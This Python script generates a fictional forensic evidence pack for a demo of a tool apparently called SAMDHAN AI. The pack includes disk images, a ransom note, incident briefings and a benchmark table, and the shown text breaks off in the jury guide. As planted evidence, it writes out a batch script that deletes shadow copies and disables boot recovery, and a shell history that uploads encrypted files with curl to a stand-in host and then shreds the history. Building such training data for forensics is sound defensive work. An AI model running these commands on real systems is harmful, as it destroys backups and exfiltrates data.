#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SAMDHAN AI - Forensic Sample Data Generator for Jury & Live Demonstrations
Creates a complete, authentic, spec-compliant 'sample_data' package in the project root.
"""

import os
import sys
import io
import json
import zlib
import struct
import hashlib
import sqlite3
import zipfile
from pathlib import Path
from datetime import datetime

ROOT_DIR = Path(__file__).parent.parent if Path(__file__).parent.name == "scripts" else Path(__file__).parent
SAMPLE_DIR = ROOT_DIR / "sample_data"

def compute_hashes(data: bytes):
    return {
        "sha256": hashlib.sha256(data).hexdigest(),
        "md5": hashlib.md5(data).hexdigest(),
        "size": len(data),
    }

def create_raw_disk_image_nightfall(out_path: Path):
    """Generates a 2MB realistic raw disk bitstream dump (.dd) with embedded forensic artifacts."""
    image_size = 2 * 1024 * 1024  # 2MB
    buf = bytearray(image_size)

    # 1. Fake MBR / Partition Table at sector 0 (0x0000 - 0x01FF)
    buf[0:3] = b"\xeb\x58\x90"  # JMP short
    buf[3:11] = b"SAMDHAN "     # OEM-ID
    buf[510:512] = b"\x55\xaa"  # MBR signature

    # 2. Simulated Ext4 Superblock at 0x0400 (Sector 2)
    ext4_magic = b"\x53\xef"
    buf[0x0400 + 0x38 : 0x0400 + 0x3A] = ext4_magic

    # 3. Embed Ransomware Note at 0x0004F000 (Sector 632)
    ransom_note = (
        "!!! ATTENTION INVESTORS & SYSTEM ADMINISTRATORS !!!\n"
        "All your virtual machines, hypervisors, and SQL clusters have been encrypted by BlackCat Ransomware Group.\n"
        "We have exfiltrated 420GB of confidential source code, customer records, and banking credentials.\n"
        "To purchase the private decryptor and avoid public leak on dark web:\n"
        "1. Visit Tor portal: http://exfil.darkmesh.onion/auth?id=9928-NIGHTFALL\n"
        "2. Deposit 15.5 BTC to: bitcoin:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n"
        "Deadline: 72 hours from: 2026-09-24 18:00:00 UTC.\n"
        "Do NOT reboot or modify encrypted partitions, or your keys will be destroyed.\n"
    ).encode("utf-8")
    offset_note = 0x0004F000
    buf[offset_note : offset_note + len(ransom_note)] = ransom_note

    # 4. Embed Batch Wiper Script at 0x0008A000
    wiper_script = (
        "@echo off\n"
        "REM BlackCat Inhibit System Recovery Staging Script\n"
        "vssadmin.exe delete shadows /all /quiet\n"
        "wbadmin.exe delete catalog -quiet\n"
        "bcedit.exe /set {default} bootstatuspolicy ignoreallfailures\n"
        "bcedit.exe /set {default} recoveryenabled no\n"
        "powershell -WindowStyle Hidden -Command \"Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }\"\n"
        "net.exe stop \"VSS\"\n"
        "net.exe stop \"SDRSVC\"\n"
    ).encode("utf-8")
    offset_wiper = 0x0008A000
    buf[offset_wiper : offset_wiper + len(wiper_script)] = wiper_script

    # 5. Embed SQLite auth log fragment at 0x000E0000
    sqlite_hdr = b"SQLite format 3\x00\x10\x00\x01\x01\x00@  \x00\x00\x00\x01\x00\x00\x00\x02"
    buf[0x000E0000 : 0x000E0000 + len(sqlite_hdr)] = sqlite_hdr

    # Add realistic pseudo-noise in unallocated sectors
    for i in range(0x000F0000, 0x001A0000, 512):
        if i % 1024 == 0:
            buf[i : i + 32] = hashlib.sha256(str(i).encode()).digest()

    out_path.write_bytes(bytes(buf))
    return compute_hashes(buf)

def create_raw_disk_image_aegis(out_path: Path):
    """Generates a 1.5MB raw carved unallocated dump (.raw) for Project Aegis exfiltration."""
    size = int(1.5 * 1024 * 1024)
    buf = bytearray(size)

    # ExFAT VBR signature at 0
    buf[0:3] = b"\xeb\x76\x90"
    buf[3:11] = b"EXFAT   "
    buf[510:512] = b"\x55\xaa"

    # Embed Exfiltration Shell Commands at 0x00032000
    bash_history = (
        "# Recovered from unallocated sector 400 (exFAT cluster 25)\n"
        "2026-09-22 17:14:02  cd /opt/aegis/propulsion_blueprints\n"
        "2026-09-22 17:14:15  tar -czvf /tmp/aegis_schematics_v3.tar.gz ./cad_models/*.dwg ./specs/*.pdf\n"
        "2026-09-22 17:15:30  gpg --batch --yes --passphrase-file /tmp/.key -c /tmp/aegis_schematics_v3.tar.gz\n"
        "2026-09-22 17:16:01  curl -k -F \"file=@/tmp/aegis_schematics_v3.tar.gz.gpg\" https://ftp.dropzone-7.net/upload/ingest\n"
        "2026-09-22 17:16:45  rm -rf /tmp/aegis_schematics_v3.*\n"
        "2026-09-22 17:17:10  shred -u -z -n 5 ~/.bash_history\n"
        "2026-09-22 17:17:35  history -c && exit\n"
    ).encode("utf-8")
    buf[0x00032000 : 0x00032000 + len(bash_history)] = bash_history

    out_path.write_bytes(bytes(buf))
    return compute_hashes(buf)

def create_pdf_reportlab(out_path: Path, title: str, subtitle: str, content: str, watermark: str = "CONFIDENTIAL"):
    """Uses ReportLab to generate a clean, formatted PDF document with forensic metadata."""
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas
        from reportlab.lib import colors

        c = canvas.Canvas(str(out_path), pagesize=letter)
        c.setTitle(title)
        c.setAuthor("Dr. Elena Rostova - Principal Propulsion Engineer")
        c.setSubject("Project Aegis Hypersonic Propulsion Schematics")
        c.setCreator("SAMDHAN AI Forensic Demo Suite v2.4")

        # Watermark
        c.saveState()
        c.setFont("Helvetica-Bold", 48)
        c.setFillColor(colors.HexColor("#ff4444"), alpha=0.12)
        c.translate(300, 400)
        c.rotate(45)
        c.drawCentredString(0, 0, watermark)
        c.restoreState()

        # Header Banner
        c.setFillColor(colors.HexColor("#0f172a"))
        c.rect(0, 740, 612, 52, fill=True, stroke=False)
        c.setFillColor(colors.HexColor("#22d3ee"))
        c.setFont("Helvetica-Bold", 14)
        c.drawString(40, 760, "PROJECT AEGIS -- RESTRICTED DEFENSE TECHNICAL MEMORANDUM")
        c.setFont("Helvetica", 9)
        c.setFillColor(colors.HexColor("#94a3b8"))
        c.drawString(40, 748, "CLASSIFICATION: TOP SECRET // ORCON // NOFORN | EYES ONLY")

        # Body
        c.setFillColor(colors.HexColor("#1e293b"))
        c.setFont("Helvetica-Bold", 16)
        c.drawString(40, 700, title)

        c.setFont("Helvetica-Oblique", 11)
        c.setFillColor(colors.HexColor("#64748b"))
        c.drawString(40, 680, subtitle)

        c.setStrokeColor(colors.HexColor("#cbd5e1"))
        c.setLineWidth(1)
        c.line(40, 665, 572, 665)

        y = 640
        c.setFont("Courier", 9.5)
        c.setFillColor(colors.HexColor("#0f172a"))
        for line in content.split("\n"):
            c.drawString(40, y, line)
            y -= 16
            if y < 60:
                c.showPage()
                y = 740

        # Footer
        c.setFont("Helvetica", 8)
        c.setFillColor(colors.HexColor("#64748b"))
        c.drawString(40, 30, "EVIDENCE INTEGRITY NOTICE: Recovered by SAMDHAN AI Forensics Engine. SHA-256 Bitstream Verified.")
        c.drawRightString(572, 30, "EXHIBIT ID: EX-2026-AEGIS-044")

        c.showPage()
        c.save()
        return True
    except Exception as e:
        print(f"Warning: reportlab PDF generation failed ({e}), falling back to minimal PDF")
        return False

def create_sqlite_database(out_path: Path):
    """Creates a real SQLite forensic database with breach log events."""
    if out_path.exists():
        out_path.unlink()
    conn = sqlite3.connect(str(out_path))
    cur = conn.cursor()

    cur.execute("""
        CREATE TABLE system_auth_audit (
            event_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp_utc TEXT NOT NULL,
            source_ip TEXT NOT NULL,
            user_account TEXT NOT NULL,
            event_type TEXT NOT NULL,
            status TEXT NOT NULL,
            process_name TEXT,
            details TEXT
        )
    """)

    events = [
        ("2026-09-24 14:02:11", "192.168.1.45", "svc_backup", "SERVICE_AUTH", "SUCCESS", "backup_agent.exe", "Normal automated backup invocation"),
        ("2026-09-24 15:42:00", "198.51.100.24", "root", "SSH_LOGIN_ATTEMPT", "FAILURE", "sshd[4102]", "Password brute-force attempt 1/40"),
        ("2026-09-24 15:42:03", "198.51.100.24", "root", "SSH_LOGIN_ATTEMPT", "FAILURE", "sshd[4105]", "Password brute-force attempt 2/40"),
        ("2026-09-24 15:48:19", "198.51.100.24", "hchen_admin", "SSH_LOGIN_ATTEMPT", "SUCCESS", "sshd[4190]", "Compromised credential login from foreign ASN"),
        ("2026-09-24 15:52:40", "127.0.0.1", "hchen_admin", "PRIVILEGE_ESCALATION", "SUCCESS", "sudo", "NOPASSWD execution of /bin/bash"),
        ("2026-09-24 16:11:15", "127.0.0.1", "root", "MALICIOUS_EXEC", "TRIGGERED", "blackcat_ransom.exe", "Process started from /tmp/.cache/"),
        ("2026-09-24 16:12:05", "127.0.0.1", "root", "SHADOW_COPY_DELETED", "CRITICAL", "vssadmin.exe", "vssadmin delete shadows /all /quiet"),
        ("2026-09-24 16:15:30", "127.0.0.1", "root", "DB_PURGE", "CRITICAL", "sqlite3", "DROP TABLE financial_audit_2026; VACUUM;"),
        ("2026-09-24 16:20:00", "198.51.100.24", "root", "DATA_EXFILTRATION", "COMPLETED", "curl", "Exfiltrated 420MB to exfil.darkmesh.onion"),
    ]

    for ev in events:
        cur.execute("INSERT INTO system_auth_audit (timestamp_utc, source_ip, user_account, event_type, status, process_name, details) VALUES (?,?,?,?,?,?,?)", ev)

    conn.commit()
    conn.close()

def create_docx_file(out_path: Path):
    """Generates a valid DOCX file (ZIP container with Word XML)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '</Types>')
        zf.writestr("_rels/.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
            '</Relationships>')
        doc_xml = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body>'
            '<w:p><w:r><w:rPr><w:b/><w:color w:val="C00000"/><w:sz w:val="32"/></w:rPr><w:t>STRICTLY CONFIDENTIAL -- BOARD OF DIRECTORS MEMO</w:t></w:r></w:p>'
            '<w:p><w:r><w:rPr><w:i/><w:color w:val="595959"/></w:rPr><w:t>Subject: Project Aegis Commercial Valuation &amp; Intellectual Property Security</w:t></w:r></w:p>'
            '<w:p><w:r><w:t>Date: September 22, 2026 | Classification: Restricted Trade Secret</w:t></w:r></w:p>'
            '<w:p><w:r><w:t>The proprietary ion-propulsion drive developed under Project Aegis represents an estimated $140M in capitalized R&amp;D. Any unauthorized disclosure of CAD files, telemetry schemas, or firmware binaries constitutes an existential competitive injury to the corporation.</w:t></w:r></w:p>'
            '<w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Action Items: Immediately rotate all cryptographic keys in the Admin Vault and isolate unallocated USB endpoints.</w:t></w:r></w:p>'
            '</w:body></w:document>'
        )
        zf.writestr("word/document.xml", doc_xml)
    out_path.write_bytes(buf.getvalue())

def create_fragment_series(scenario_dir: Path):
    """Generates authentic sliced binary fragments for the reconstruction engine."""
    scenario_dir.mkdir(parents=True, exist_ok=True)

    # 1. Scenario A: Shuffled JPEG fragments
    scen_a = scenario_dir / "SCENARIO_A_SHUFFLED_JPEG"
    scen_a.mkdir(parents=True, exist_ok=True)

    soi_app0 = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    dqt_sof0 = b"\xff\xdb\x00\x43\x00" + bytes([(i * 5 + 3) % 255 for i in range(64)]) + b"\xff\xc0\x00\x11\x08" + struct.pack(">HH", 64, 64) + b"\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01"
    dht_sos = b"\xff\xc4\x00\x1f\x00" + bytes([0]*16 + [1]*12) + b"\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00"
    entropy_payload = bytes([(i * 11 + 7) % 256 for i in range(512)])
    eoi_terminator = b"\xff\xd9"

    # Write fragments (shuffled numbering to simulate forensic carver output)
    (scen_a / "frag_01_soi_header.bin").write_bytes(soi_app0)
    (scen_a / "frag_02_dqt_sof_frame.bin").write_bytes(dqt_sof0)
    (scen_a / "frag_03_dht_sos_tables.bin").write_bytes(dht_sos)
    (scen_a / "frag_04_scan_entropy.bin").write_bytes(entropy_payload)
    (scen_a / "frag_05_eoi_terminator.bin").write_bytes(eoi_terminator)
    (scen_a / "truth_reassembled.jpg").write_bytes(soi_app0 + dqt_sof0 + dht_sos + entropy_payload + eoi_terminator)

    # 2. Scenario B: Missing Tail PNG (Truncated stream)
    scen_b = scenario_dir / "SCENARIO_B_MISSING_TAIL_PNG"
    scen_b.mkdir(parents=True, exist_ok=True)
    png_sig_ihdr = b"\x89PNG\r\n\x1a\n" + struct.pack(">I", 13) + b"IHDR" + struct.pack(">IIBBBBB", 16, 16, 8, 2, 0, 0, 0) + struct.pack(">I", 0x4f12a8bc)
    raw_rows = b"".join(b"\x00" + b"\x00\xff\xcc" * 16 for _ in range(16))
    idat_body = struct.pack(">I", len(raw_rows)) + b"IDAT" + zlib.compress(raw_rows) + struct.pack(">I", 0x33445566)
    (scen_b / "frag_01_png_ihdr.bin").write_bytes(png_sig_ihdr)
    (scen_b / "frag_02_idat_chunk.bin").write_bytes(idat_body)
    # Notice: IEND trailer is missing!

    # 3. Scenario C: Corrupted Middle PDF
    scen_c = scenario_dir / "SCENARIO_C_CORRUPTED_MIDDLE_PDF"
    scen_c.mkdir(parents=True, exist_ok=True)
    pdf_head = b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    pdf_mid_corrupt = b"2 0 obj\n<< /CORRUPT_ZERO_BYTE_FILL" + b"\x00" * 256 + b" >>\nendobj\n"
    pdf_tail = b"xref\n0 3\n0000000000 65535 f\n0000000010 00000 n\ntrailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n180\n%%EOF\n"
    (scen_c / "frag_01_catalog.bin").write_bytes(pdf_head)
    (scen_c / "frag_02_corrupted_object.bin").write_bytes(pdf_mid_corrupt)
    (scen_c / "frag_03_xref_trailer.bin").write_bytes(pdf_tail)

def main():
    print(f"[*] Initializing SAMDHAN AI Forensic Sample Data Pack in: {SAMPLE_DIR}")
    SAMPLE_DIR.mkdir(parents=True, exist_ok=True)

    # ─────────────────────────────────────────────────────────────────────────
    # CASE 01: OPERATION NIGHTFALL
    # ─────────────────────────────────────────────────────────────────────────
    c1_dir = SAMPLE_DIR / "01_INCIDENT_OPERATION_NIGHTFALL"
    c1_dir.mkdir(parents=True, exist_ok=True)
    print("  [+] Building Case 01: Operation Nightfall (Ransomware & Wiper)...")

    # Raw disk dump
    dd_path = c1_dir / "seagate_barracuda_incident_dump.dd"
    dd_hashes = create_raw_disk_image_nightfall(dd_path)

    # Carved Ransom Note
    note_path = c1_dir / "carved_sec_004F3A20_ransom_note.txt"
    note_content = (
        "!!! ATTENTION INVESTORS & SYSTEM ADMINISTRATORS !!!\n"
        "All your virtual machines, hypervisors, and SQL clusters have been encrypted by BlackCat Ransomware Group.\n"
        "We have exfiltrated 420GB of confidential source code, customer records, and banking credentials.\n"
        "To purchase the private decryptor and avoid public leak on dark web:\n"
        "1. Visit Tor portal: http://exfil.darkmesh.onion/auth?id=9928-NIGHTFALL\n"
        "2. Deposit 15.5 BTC to: bitcoin:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n"
        "Deadline: 72 hours from: 2026-09-24 18:00:00 UTC.\n"
        "Do NOT reboot or modify encrypted partitions, or your keys will be destroyed.\n"
    )
    note_path.write_text(note_content, encoding="utf-8")
    note_hashes = compute_hashes(note_content.encode("utf-8"))

    # Malicious script
    bat_path = c1_dir / "shadow_delete_script.bat"
    bat_content = (
        "@echo off\n"
        "REM BlackCat Inhibit System Recovery Staging Script\n"
        "vssadmin.exe delete shadows /all /quiet\n"
        "wbadmin.exe delete catalog -quiet\n"
        "bcedit.exe /set {default} bootstatuspolicy ignoreallfailures\n"
        "bcedit.exe /set {default} recoveryenabled no\n"
        "powershell -WindowStyle Hidden -Command \"Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }\"\n"
        "net.exe stop \"VSS\"\n"
        "net.exe stop \"SDRSVC\"\n"
    )
    bat_path.write_text(bat_content, encoding="utf-8")
    bat_hashes = compute_hashes(bat_content.encode("utf-8"))

    # SQLite breach database
    db_path = c1_dir / "auth_audit_carve.db"
    create_sqlite_database(db_path)
    db_hashes = compute_hashes(db_path.read_bytes())

    # Executive Briefing
    briefing1 = (
        "================================================================================\n"
        "SAMDHAN AI -- DIGITAL FORENSIC INCIDENT BRIEFING REPORT\n"
        "================================================================================\n"
        "Case Identifier  : CASE-2026-NIGHTFALL\n"
        "Operation Name   : Operation Nightfall (Ransomware Attack & Shadow Copy Purge)\n"
        "Lead Examiner    : Det. H. Chen (Digital Forensics Unit, Badge #4891)\n"
        "Target Media     : Seagate Barracuda 2TB SATA (Serial: W1E89L90) Ext4 RAW Image\n"
        "Incident Window  : 2026-09-24 14:00:00 UTC to 2026-09-24 22:30:00 UTC\n"
        "Acquisition Tool : SAMDHAN AI Forensics Pipeline (Hardware Write-Blocker Bitstream)\n"
        "--------------------------------------------------------------------------------\n"
        "INCIDENT SYNOPSIS:\n"
        "At 16:11 UTC, an external threat actor leveraged compromised administrator credentials\n"
        "(hchen_admin) sourced from IP 198.51.100.24 to gain root privileges on the primary\n"
        "enterprise cluster. The attacker deployed the BlackCat ransomware payload, executed\n"
        "vssadmin shadow copy purges, dropped key financial audit tables, and exfiltrated 420GB\n"
        "of intellectual property to exfil.darkmesh.onion.\n\n"
        "PRIMARY INDICATORS OF COMPROMISE (IOCs):\n"
        "  - IP Address     : 198.51.100.24 (Foreign Tor Exit Node)\n"
        "  - C2 Domain      : exfil.darkmesh.onion\n"
        "  - BTC Wallet     : bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n"
        "  - Binary Name    : blackcat_ransom.exe\n"
        "  - Inhibit Cmd    : vssadmin delete shadows /all /quiet\n\n"
        "CHAIN OF CUSTODY CERTIFICATION:\n"
        "All evidence files listed below have been hashed using FIPS 180-4 compliant SHA-256.\n"
        "Evidence is write-locked and verified tamper-evident.\n"
        "================================================================================\n"
    )
    (c1_dir / "incident_briefing.txt").write_text(briefing1, encoding="utf-8")

    # Manifest
    manifest1 = {
        "case_id": "CASE-2026-NIGHTFALL",
        "title": "Operation Nightfall - Ransomware Disk Dump",
        "created_at": datetime.utcnow().isoformat() + "Z",
        "evidence_files": [
            {"filename": dd_path.name, "type": "Raw Disk Bitstream (.dd)", "sector_offset": "0x00000000", **dd_hashes},
            {"filename": note_path.name, "type": "Carved Ransom Note (UTF-8)", "sector_offset": "0x0004F000", **note_hashes},
            {"filename": bat_path.name, "type": "Malicious Batch Script", "sector_offset": "0x0008A000", **bat_hashes},
            {"filename": db_path.name, "type": "SQLite Forensic Database", "sector_offset": "0x000E0000", **db_hashes},
        ]
    }
    (c1_dir / "evidence_manifest.json").write_text(json.dumps(manifest1, indent=2), encoding="utf-8")

    # ─────────────────────────────────────────────────────────────────────────
    # CASE 02: PROJECT AEGIS (CORPORATE EXFILTRATION)
    # ─────────────────────────────────────────────────────────────────────────
    c2_dir = SAMPLE_DIR / "02_INCIDENT_PROJECT_AEGIS"
    c2_dir.mkdir(parents=True, exist_ok=True)
    print("  [+] Building Case 02: Project Aegis (Corporate Exfiltration)...")

    raw_path = c2_dir / "sandisk_128gb_exfat_carved.raw"
    raw_hashes = create_raw_disk_image_aegis(raw_path)

    # PDF Document
    pdf_path = c2_dir / "confidential_cad_schematic.pdf"
    pdf_body = (
        "1. EXECUTIVE OVERVIEW\n"
        "Project Aegis specifies the proprietary propulsion geometry for next-generation unmanned\n"
        "sub-orbital atmospheric gliders. Proprietary patents involve pulse detonation chambers\n"
        "and active magnetic nozzle stabilization.\n\n"
        "2. TECHNICAL SPECIFICATIONS (CONFIDENTIAL):\n"
        "  - Thrust Vectoring   : Dual Gimbal Magnetic Deflection (+/- 14.5 degrees)\n"
        "  - Chamber Pressure   : 28.4 MPa @ 2,850 Kelvin continuous duty\n"
        "  - Firmware Target    : Cortex-M7 Radiation-Hardened DSP (Revision 4.1.2)\n"
        "  - Telemetry Beacon   : 14.2 GHz Ku-band Encrypted Telemetry\n\n"
        "3. EXFILTRATION FORENSIC ASSESSMENT:\n"
        "Forensic inspection of unallocated flash sectors reveals an unauthorized GPG-compressed\n"
        "tarball 'aegis_schematics_v3.tar.gz.gpg' staged in /tmp and pushed to an external FTP\n"
        "server (ftp.dropzone-7.net). Investigator Sarah Vance identified insider user 'erostova'\n"
        "as the active identity during the exfiltration window.\n"
    )
    if not create_pdf_reportlab(pdf_path, "PROJECT AEGIS -- PROPULSION BLUEPRINTS", "Dr. Elena Rostova | Clearance Level: TOP SECRET", pdf_body):
        # Fallback simple PDF
        pdf_path.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\n0000000000 65535 f\n0000000010 00000 n\ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n140\n%%EOF\n")
    pdf_hashes = compute_hashes(pdf_path.read_bytes())

    # DOCX Memo
    docx_path = c2_dir / "executive_strategy_memo.docx"
    create_docx_file(docx_path)
    docx_hashes = compute_hashes(docx_path.read_bytes())

    # Wiped Bash Log
    bash_path = c2_dir / "wiped_bash_history.log"
    bash_content = (
        "# Carved from unallocated sector 400 (exFAT cluster 25)\n"
        "2026-09-22 17:14:02  cd /opt/aegis/propulsion_blueprints\n"
        "2026-09-22 17:14:15  tar -czvf /tmp/aegis_schematics_v3.tar.gz ./cad_models/*.dwg ./specs/*.pdf\n"
        "2026-09-22 17:15:30  gpg --batch --yes --passphrase-file /tmp/.key -c /tmp/aegis_schematics_v3.tar.gz\n"
        "2026-09-22 17:16:01  curl -k -F \"file=@/tmp/aegis_schematics_v3.tar.gz.gpg\" https://ftp.dropzone-7.net/upload/ingest\n"
        "2026-09-22 17:16:45  rm -rf /tmp/aegis_schematics_v3.*\n"
        "2026-09-22 17:17:10  shred -u -z -n 5 ~/.bash_history\n"
        "2026-09-22 17:17:35  history -c && exit\n"
    )
    bash_path.write_text(bash_content, encoding="utf-8")
    bash_hashes = compute_hashes(bash_content.encode("utf-8"))

    briefing2 = (
        "================================================================================\n"
        "SAMDHAN AI -- DIGITAL FORENSIC INCIDENT BRIEFING REPORT\n"
        "================================================================================\n"
        "Case Identifier  : CASE-2026-ESPIONAGE\n"
        "Operation Name   : Project Aegis (Corporate Trade Secret Exfiltration)\n"
        "Lead Examiner    : Inv. Sarah Vance (CIRT Forensics Specialist)\n"
        "Target Media     : SanDisk Ultra 128GB USB Flash (exFAT Unallocated Space)\n"
        "Incident Window  : 2026-09-22 08:00:00 UTC to 2026-09-22 19:00:00 UTC\n"
        "Acquisition Tool : SAMDHAN AI Bitstream Imager (Physical Sector Clone)\n"
        "--------------------------------------------------------------------------------\n"
        "INCIDENT SYNOPSIS:\n"
        "Telemetry alarms flagged an unusual 1.8GB outbound POST transfer from a development\n"
        "workstation assigned to the Propulsion Lab. Forensic recovery of unallocated cluster\n"
        "space carved deleted shell histories, CAD blueprint PDFs, and an executive strategy memo\n"
        "confirming deliberate exfiltration of proprietary IP before an employee resignation.\n\n"
        "PRIMARY INDICATORS OF COMPROMISE (IOCs):\n"
        "  - Exfil Target   : https://ftp.dropzone-7.net/upload/ingest\n"
        "  - Tarball Staged : /tmp/aegis_schematics_v3.tar.gz.gpg\n"
        "  - Wiped Log      : ~/.bash_history shredded with 5 zero passes\n"
        "================================================================================\n"
    )
    (c2_dir / "incident_briefing.txt").write_text(briefing2, encoding="utf-8")

    manifest2 = {
        "case_id": "CASE-2026-ESPIONAGE",
        "title": "Project Aegis - Corporate Exfiltration USB Dump",
        "created_at": datetime.utcnow().isoformat() + "Z",
        "evidence_files": [
            {"filename": raw_path.name, "type": "Carved Unallocated Image (.raw)", **raw_hashes},
            {"filename": pdf_path.name, "type": "Confidential Technical Schematic (.pdf)", **pdf_hashes},
            {"filename": docx_path.name, "type": "Executive Strategy Memorandum (.docx)", **docx_hashes},
            {"filename": bash_path.name, "type": "Recovered Exfiltration Shell History (.log)", **bash_hashes},
        ]
    }
    (c2_dir / "evidence_manifest.json").write_text(json.dumps(manifest2, indent=2), encoding="utf-8")

    # ─────────────────────────────────────────────────────────────────────────
    # CASE 03: CARVED FRAGMENTS FOR RECONSTRUCTION
    # ─────────────────────────────────────────────────────────────────────────
    c3_dir = SAMPLE_DIR / "03_CARVED_FRAGMENTS_FOR_RECONSTRUCTION"
    print("  [+] Building Case 03: Carved Fragments for Graph Reconstruction...")
    create_fragment_series(c3_dir)

    frag_manifest = {
        "description": "Deterministic binary fragments for Feature 01 (Intelligent Fragment Reconstruction)",
        "scenarios": [
            {
                "id": "A",
                "folder": "SCENARIO_A_SHUFFLED_JPEG",
                "condition": "5 Fragments Shuffled in Random Order",
                "objective": "Demonstrate directed graph edge scoring & reordering into 100% valid JPEG"
            },
            {
                "id": "B",
                "folder": "SCENARIO_B_MISSING_TAIL_PNG",
                "condition": "Omitted IEND Terminator",
                "objective": "Demonstrate missing chunk gap detection & partial reconstruction flag"
            },
            {
                "id": "C",
                "folder": "SCENARIO_C_CORRUPTED_MIDDLE_PDF",
                "condition": "Corrupted Middle Object (Zero-Fill)",
                "objective": "Demonstrate structural validator error localisation & confidence degradation"
            }
        ]
    }
    (c3_dir / "fragments_manifest.json").write_text(json.dumps(frag_manifest, indent=2), encoding="utf-8")

    # ─────────────────────────────────────────────────────────────────────────
    # CASE 04: ARTIFACT INTEGRITY BENCHMARK (15 SPEC VARIANTS)
    # ─────────────────────────────────────────────────────────────────────────
    c4_dir = SAMPLE_DIR / "04_ARTIFACT_INTEGRITY_BENCHMARK"
    c4_dir.mkdir(parents=True, exist_ok=True)
    print("  [+] Copying Case 04: 15 Spec Benchmark Artifacts...")

    source_reconstructed = ROOT_DIR / "backend" / "demo_data" / "reconstructed"
    if source_reconstructed.exists():
        for f in source_reconstructed.iterdir():
            if f.is_file():
                dest = c4_dir / f.name
                dest.write_bytes(f.read_bytes())

    # Build Matrix Markdown for Jury
    matrix_md = """# SAMDHAN AI -- 15 Artifact Integrity Benchmark Matrix
This folder contains the complete benchmark evaluation suite conforming to Specification Section 21.

| Artifact ID | Filename | Format | State | Integrity Score | Expected Corruption Analysis |
|:------------|:---------|:-------|:------|:----------------|:-----------------------------|
| **ART-001** | `art001_jpeg_intact.jpg` | JPEG | Intact | **98.4%** | Valid SOI, DQT, SOF0, DHT, SOS, EOI. Zero corruption. |
| **ART-002** | `art002_jpeg_missing_tail.jpg` | JPEG | Truncated Tail | **87.0%** | Missing EOI marker. Tail truncated by 200 bytes. Type A missing data. |
| **ART-003** | `art003_jpeg_corrupted_mid.jpg` | JPEG | Corrupted Middle | **82.0%** | 512-byte zero-fill replacement inside entropy scan. Type C corruption. |
| **ART-004** | `art004_pdf_intact.pdf` | PDF | Intact | **99.1%** | Full catalog, page tree, trailer, startxref, %%EOF verified. |
| **ART-005** | `art005_pdf_damaged_obj.pdf` | PDF | Corrupted Object | **85.0%** | Object 4 stream has broken syntax and byte corruption. |
| **ART-006** | `art006_pdf_missing_page.pdf` | PDF | Missing Xref Page | **79.0%** | Missing xref table entries; incomplete page tree. |
| **ART-007** | `art007_docx_intact.docx` | DOCX | Intact | **99.5%** | Valid ZIP container, intact `[Content_Types].xml` & document XML. |
| **ART-008** | `art008_docx_damaged_xml.docx` | DOCX | Damaged XML | **71.0%** | XML truncated mid-tag. Unclosed `<w:document>` tag. |
| **ART-009** | `art009_docx_broken_zip.docx` | DOCX | Broken ZIP Header | **52.0%** | Corrupt central directory header. Container cannot decompress. |
| **ART-010** | `art010_sqlite_intact.db` | SQLite | Intact | **99.0%** | Valid 100-byte SQLite header, intact B-Tree leaf pages, clean WAL. |
| **ART-011** | `art011_sqlite_damaged_page.db` | SQLite | Damaged B-Tree Page | **77.0%** | Corrupted page 2 leaf header with `DEADBEEF` overwrite. |
| **ART-012** | `art012_sqlite_missing_records.db` | SQLite | Truncated Pages | **88.0%** | Trailing 4,096 bytes truncated. Partial recovery of 10/20 rows. |
| **ART-013** | `art013_log_complete.log` | LOG | Intact | **99.0%** | Complete 50-line SSH auth audit log with sequential timestamps. |
| **ART-014** | `art014_log_missing_lines.log` | LOG | Missing Lines | **82.0%** | Last 40% of log lines truncated during breach window. |
| **ART-015** | `art015_log_malformed.log` | LOG | Injected Binary Corruption | **76.0%** | Injected null bytes (`0x00 0xFF`) and malformed log records. |
"""
    (c4_dir / "BENCHMARK_MATRIX.md").write_text(matrix_md, encoding="utf-8")

    # ─────────────────────────────────────────────────────────────────────────
    # JURY PRESENTATION GUIDE & SCRIPT
    # ─────────────────────────────────────────────────────────────────────────
    jury_guide = """# 🎯 SAMDHAN AI -- JURY & JUDGES PRESENTATION GUIDE
Use this exact playbook when presenting SAMDHAN AI to the jury and technical evaluators.

---

## ⏱️ 3-Minute Live Demonstration Sequence

